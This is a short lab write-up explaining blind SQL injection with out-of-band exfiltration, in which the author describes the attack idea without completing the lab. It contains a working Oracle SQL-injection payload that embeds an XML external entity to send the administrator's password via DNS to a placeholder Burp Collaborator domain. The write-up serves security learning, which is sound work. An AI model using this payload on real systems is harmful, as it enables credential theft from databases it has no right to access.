# Lab: Blind SQL injection with out-of-band data exfiltration
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

## Disclaimer
**This room requires Burp Collaborator, which is only usably with Burp Suite Professional.**

So for me this lab is not solvable. But I will explain the idea behind the attack and the payload you could use.

## Solution
The basics of the vulnerability can be found in the writeup of the privious lab ([Blind SQL injection with out-of-band interaction](Blind_SQL_injection_with_out-of-band_interaction.md)).

The task of this lab, is to level this up and actually get some data over this DNS request. For that we could use the following query:
```
TrackingId=' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual) ||'
```

It is pretty much the same like before. The statement creates a DNS request to the collaborator. But this time there is a nested query in the subdomain of the collaborator: `SELECT password FROM users WHERE username='administrator'`

This nested query will be executed and the DNS request will contain a subdomain consisting of the data from the answer of this SQL query.

In Burp Collaborator we would see the DNS request after the following scheme: `PASSWORD.BURP-COLLABORATOR-SUBDOMAIN.burpcollaborator.net`

With the password we could login as administrator and the lab would be solved.
